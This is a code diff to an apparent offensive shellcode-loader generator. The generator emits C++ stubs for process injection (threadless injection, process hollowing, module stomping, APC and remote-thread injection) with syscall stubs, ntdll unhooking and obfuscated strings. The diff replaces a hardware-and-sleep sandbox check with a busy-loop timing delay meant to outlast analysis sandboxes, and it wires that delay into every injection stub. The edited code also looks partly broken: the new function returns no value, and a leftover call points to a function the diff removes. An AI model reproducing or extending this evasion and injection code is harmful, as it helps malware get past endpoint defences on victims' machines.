@@ -44,6 +44,8 @@ REPLACE_SAFEPRINT_FUNCTIONS
 
 REPLACE_ME_SYSCALL_STUB_P1
 
+REPLACE_SLEEP_CHECK
+
 REPLACE_SANDBOX_CHECK
 
 REPLACE_ME_NTDLL_UNHOOK
@@ -503,30 +505,30 @@ NoSyscall_StubP2 = """
     NtDelayExecution = (myNtDelayExecution)(GetProcAddress(GetModuleHandleA(Nt), scall.c_str()));
 """
 
-sandbox_check = """
-//thanks @Cerbersec!
-BOOL CheckSandbox() {
-    SYSTEM_INFO systemInfo;
-    GetSystemInfo(&systemInfo);
-    if (systemInfo.dwNumberOfProcessors < 2)
-        return TRUE;
-
-    MEMORYSTATUSEX memoryStatus;
-    memoryStatus.dwLength = sizeof(memoryStatus);
-    GlobalMemoryStatusEx(&memoryStatus);
-    if (memoryStatus.ullTotalPhys / 1024 / 1024 < 2048)
-        return TRUE;
-
+sleep_check = """
+BOOL SleepCheck() {
     ULONG64 timeBeforeSleep = GetTickCount64();
-    LARGE_INTEGER delay;
-    delay.QuadPart = -10000 * 60000;
-    safe_print(skCrypt("Please wait 60 seconds..."));
-    NtDelayExecution(FALSE, &delay);
-    ULONG64 timeAfterSleep = GetTickCount64();
-    if (timeAfterSleep - timeBeforeSleep < 60000)
-        return TRUE;
 
-    return FALSE;
+    for (;;) {
+
+        int flag = 0;
+        for (int n = 1; n < 5555; n++) {
+            if (n == 0 || n == 1)
+                flag = 1;
+
+            for (int i = 2; i <= n / 2; ++i) {
+                if (n % i == 0) {
+                    flag = 1;
+                    break;
+                }
+            }
+        }
+
+        ULONG64 timeAfterSleep = GetTickCount64();
+        if (timeAfterSleep - timeBeforeSleep > 10000) {
+            break;
+        }
+    }
 }
 """
 
@@ -1046,8 +1048,9 @@ threadless_inject_nocreate_stub = """
 # Majority of code from 0xLegacyy, modified for our needs: https://github.com/iilegacyyii/ThreadlessInject-BOF
 threadless_inject_stub = """
 
+    REPLACE_ME_SLEEP_CALL
     REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
-    REPLACE_ME_SANDBOX_CALL
+    //REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
     deC(REPLACE_ME_DECARG);
@@ -1172,6 +1175,8 @@ threadless_inject_stub = """
 """
 
 module_stomping_stub = """
+
+    REPLACE_ME_SLEEP_CALL
     HANDLE processHandle;
     PVOID remoteBuffer;
     auto moduleToInject = skCrypt("mstscax.dll");
@@ -1185,7 +1190,7 @@ module_stomping_stub = """
     HMODULE remoteModule = NULL;
 
     REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
-    REPLACE_ME_SANDBOX_CALL
+    //REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
     deC(REPLACE_ME_DECARG);
@@ -1332,8 +1337,9 @@ module_stomping_stub = """
 """
 
 process_hollow_stub = """
+    REPLACE_ME_SLEEP_CALL
     REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
-    REPLACE_ME_SANDBOX_CALL
+    //REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
     deC(REPLACE_ME_DECARG);
@@ -1471,8 +1477,9 @@ process_hollow_stub = """
 """
 
 CurrentThread_stub = """
+    REPLACE_ME_SLEEP_CALL
     REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
-    REPLACE_ME_SANDBOX_CALL
+    //REPLACE_ME_SANDBOX_CALL
 
     HANDLE hProc = GetCurrentProcess();
     DWORD oldprotect = 0;
@@ -1549,8 +1556,9 @@ CurrentThread_stub = """
 """
 
 EnumDisplayMonitors_stub = """
+    REPLACE_ME_SLEEP_CALL
     REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
-    REPLACE_ME_SANDBOX_CALL
+    //REPLACE_ME_SANDBOX_CALL
 
     HANDLE hProc = GetCurrentProcess();
     DWORD oldprotect = 0;
@@ -1597,13 +1605,14 @@ EnumDisplayMonitors_stub = """
 
 QueueUserAPC_stub = """
 
+    REPLACE_ME_SLEEP_CALL
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
     SIZE_T bytesWritten;
     SIZE_T pnew = payload_len;
 
     REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
-    REPLACE_ME_SANDBOX_CALL
+    //REPLACE_ME_SANDBOX_CALL
     REPLACE_ME_CALL_UNHOOK
     REPLACE_ME_SYSCALL_STUB_P2
     deC(REPLACE_ME_DECARG);
@@ -1680,6 +1689,8 @@ QueueUserAPC_stub = """
 """
 
 RemoteThreadSuspended_stub = """
+
+    REPLACE_ME_SLEEP_CALL
     REPLACE_ME_SYSCALL_STUB_P2
 
     DWORD oldprotect = 0;
@@ -1690,7 +1701,7 @@ RemoteThreadSuspended_stub = """
     SIZE_T pnew = payload_len;
 
     REPLACE_ME_SYSCALL_STUB_B4_SANDBOX
-    REPLACE_ME_SANDBOX_CALL
+    //REPLACE_ME_SANDBOX_CALL
     deC(REPLACE_ME_DECARG);
 
     PROCESSENTRY32 entry;
@@ -1792,6 +1803,7 @@ RemoteThreadSuspended_stub = """
 """
 
 RemoteThreadContext_stub = """
+    REPLACE_ME_SLEEP_CALL
     DWORD oldprotect = 0;
     PVOID base_addr = NULL;
     SIZE_T bytesWritten;
@@ -1908,10 +1920,7 @@ RemoteThreadContext_stub = """
 """
 
 invoke_sandbox_check = """
-    if (CheckSandbox()) {
-        safe_print(skCrypt("Sandbox checks failed; exiting."));
-        return 0;
-    }
+    CheckSandbox();
 
     safe_print(skCrypt("Sandbox checks passed"));
 """
@@ -2288,30 +2297,31 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
     if no_sandbox == True:
         print("[+] Sandbox checks have been disabled")
         stub = stub.replace("REPLACE_SANDBOX_CHECK", "")
-        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "")
+        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "")
     elif sandbox == "dll":
         print("[+] Using DLL enumeration for sandbox evasion")
         stub = stub.replace("REPLACE_SANDBOX_CHECK", dll_sandbox_check)
-        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "getLoadedDlls();")
+        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "getLoadedDlls();")
     elif sandbox == "hostname":
         print("[+] Using hostname enumeration for sandbox evasion")
         stub = stub.replace("REPLACE_SANDBOX_CHECK", hostname_sanbox_check)
         stub = stub.replace("REPLACE_ME_HOSTNAME", sandbox_arg)
-        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "hostcheck();")
+        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "hostcheck();")
     elif sandbox == "username":
         print("[+] Using username enumeration for sandbox evasion")
         stub = stub.replace("REPLACE_SANDBOX_CHECK", username_sanbox_check)
         stub = stub.replace("REPLACE_ME_USERNAME", sandbox_arg)
-        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "usercheck();")
+        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "usercheck();")
     elif sandbox == "domain":
         print("[+] Using domain enumeration for sandbox evasion")
         stub = stub.replace("REPLACE_SANDBOX_CHECK", domain_sanbox_check)
         stub = stub.replace("REPLACE_ME_DOMAINNAME", sandbox_arg)
-        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", "domaincheck();")
+        stub = stub.replace("//REPLACE_ME_SANDBOX_CALL", "domaincheck();")
     else:
         print("[+] Using sleep technique for sandbox evasion")
-        stub = stub.replace("REPLACE_SANDBOX_CHECK", sandbox_check)
-        stub = stub.replace("REPLACE_ME_SANDBOX_CALL", invoke_sandbox_check)
+        stub = stub.replace("REPLACE_SANDBOX_CHECK", "")
+    stub = stub.replace("REPLACE_SLEEP_CHECK", sleep_check)
+    stub = stub.replace("REPLACE_ME_SLEEP_CALL", "SleepCheck();")
 
     # Thanks tothi! https://github.com/tothi/dll-hijack-by-proxying
     if dll_proxy != None:
